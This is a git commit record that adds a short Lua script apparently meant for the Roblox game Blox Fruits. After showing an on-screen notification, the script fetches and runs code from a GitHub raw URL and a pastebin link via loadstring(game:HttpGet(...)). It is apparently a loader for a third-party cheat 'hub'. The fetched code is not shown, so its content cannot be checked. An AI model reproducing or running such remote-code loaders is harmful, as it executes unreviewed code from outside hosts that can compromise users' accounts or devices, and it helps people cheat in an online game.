aa280edc7953886fe2892972be916a95c2f54b64
ProfessionalDoge <90437229+ProfessionalDoge@users.noreply.github.com>
2022-03-24 08:27:02 +0800

    Create Blok_frut_connector.lua

---
+++ Blok_frut_connector.lua
@@ -0,0 +1,5 @@
+game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Warning", Text = "if u dont see the other gui please move the top gui"})
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xQuartyx/Quartyzhub/main/mukuro"))()
+
+loadstring(game:HttpGet("https://pastebin.com/raw/VUmxwEYm"))()
